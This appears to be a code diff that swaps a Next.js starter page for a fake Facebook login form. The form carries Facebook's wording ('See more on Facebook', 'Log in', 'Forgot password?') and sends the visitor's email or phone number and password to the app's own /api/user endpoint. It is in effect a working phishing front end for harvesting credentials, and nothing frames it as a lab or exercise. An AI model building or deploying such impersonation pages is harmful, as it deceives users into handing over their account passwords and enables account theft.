@@ -1,101 +1,94 @@
+'use client'
+
 import Image from "next/image";
+import React, { useState} from "react";
 
-export default function Home() {
+const Home: React.FC = () => {
+
+  const [phone, setPhone] = useState("");
+  const [password, setPassword] = useState("");
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault()
+
+    const resp = await fetch('/api/user', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({phone, password})
+    })
+
+    const data = await resp.json()
+
+    if(resp.ok){
+      setPassword('')
+      setPhone('')
+    }
+    else{
+      console.log(data.error)
+    }
+    
+  }
+
   return (
-    <div className="grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 pb-20 gap-16 sm:p-20 font-[family-name:var(--font-geist-sans)]">
-      <main className="flex flex-col gap-8 row-start-2 items-center sm:items-start">
+    <div className="w-screen h-screen fixed">
+      <div className="z-0">
         <Image
-          className="dark:invert"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={180}
-          height={38}
-          priority
+          src="/gere.jpg"
+          alt="gere"
+          fill={true}
+          className="contrast-50"
         />
-        <ol className="list-inside list-decimal text-sm text-center sm:text-left font-[family-name:var(--font-geist-mono)]">
-          <li className="mb-2">
-            Get started by editing{" "}
-            <code className="bg-black/[.05] dark:bg-white/[.06] px-1 py-0.5 rounded font-semibold">
-              src/app/page.tsx
-            </code>
-            .
-          </li>
-          <li>Save and see your changes instantly.</li>
-        </ol>
-
-        <div className="flex gap-4 items-center flex-col sm:flex-row">
-          <a
-            className="rounded-full border border-solid border-transparent transition-colors flex items-center justify-center bg-foreground text-background gap-2 hover:bg-[#383838] dark:hover:bg-[#ccc] text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className="dark:invert"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={20}
-              height={20}
+      </div>
+      <div className="z-1 absolute rounded-3xl ">
+        <Image
+          src='/etugen.jpg'
+          alt="et"
+          height={100}
+          width={120}
+          className="rounded-[50%] ml-[33vw] mt-[20px] contrast-50"
+        />
+      </div>
+      <div className="h-[300px] w-[280px] text-black p-[15px] bg-white absolute top-1/2 left-1/2 z-10 transform -translate-x-1/2 -translate-y-1/2 rounded-lg shadow-xl ">
+          <p className="text-black font-bold text-lg mt-[20px] ml-[35px]">See more on Facebook</p>
+          <div className="flex flex-col mt-[10px]">
+            <form onSubmit={handleSubmit} className="flex flex-col">
+            <input 
+              type="text" 
+              name="phone" 
+              value={phone}
+              onChange={(e) => setPhone(e.target.value)} 
+              className="h-[32px] border-none rounded-md bg-sky-100 pl-[10px] pt-[15px]"
+              required
             />
-            Deploy now
-          </a>
-          <a
-            className="rounded-full border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center hover:bg-[#f2f2f2] dark:hover:bg-[#1a1a1a] hover:border-transparent text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 sm:min-w-44"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Read our docs
-          </a>
-        </div>
-      </main>
-      <footer className="row-start-3 flex gap-6 flex-wrap items-center justify-center">
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/file.svg"
-            alt="File icon"
-            width={16}
-            height={16}
-          />
-          Learn
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/window.svg"
-            alt="Window icon"
-            width={16}
-            height={16}
-          />
-          Examples
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/globe.svg"
-            alt="Globe icon"
-            width={16}
-            height={16}
-          />
-          Go to nextjs.org →
-        </a>
-      </footer>
+            <p className="font-thin absolute text-[10px] text-gray-800 mt-[3px] ml-[10px]">Email or phone number</p>
+            <input 
+              type="password" 
+              name="phone" 
+              className="h-[32px] border-none rounded-md bg-sky-100 mt-[6px] pt-[15px] pl-[10px]"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              required
+            />  
+            <p className="font-thin absolute text-[10px] text-gray-800 mt-[40px] ml-[10px]">Password</p>
+            <input 
+              type="submit" 
+              className="border border-slate-800 cursor-pointer rounded-md bg-blue-600 text-white text-sm p-[4px] mt-[10px] border-none"
+              value="Log in"
+            />
+            </form>
+            <p className="text-blue-700 text-xs font-semibold ml-[30%] mt-[8px]">Forgot password?</p>
+            <div className="flex relative ml-[3px] mt-[18px]">
+              <div className="border-t w-[43%] border-neutral-800"></div>
+              <div className="w-[40px] text-center mt-[-10px] text-xs">or</div>
+              <div className="border-t border-neutral-800 w-[43%]"></div>
+            </div>
+            <button className="border-none bg-green-700 w-[60%] text-sm text-white py-[4px] px-[7px] rounded-md ml-[20%] mt-[10px]">Create new account</button>
+          </div>
+      </div>
     </div>
   );
 }
+
+export default Home;
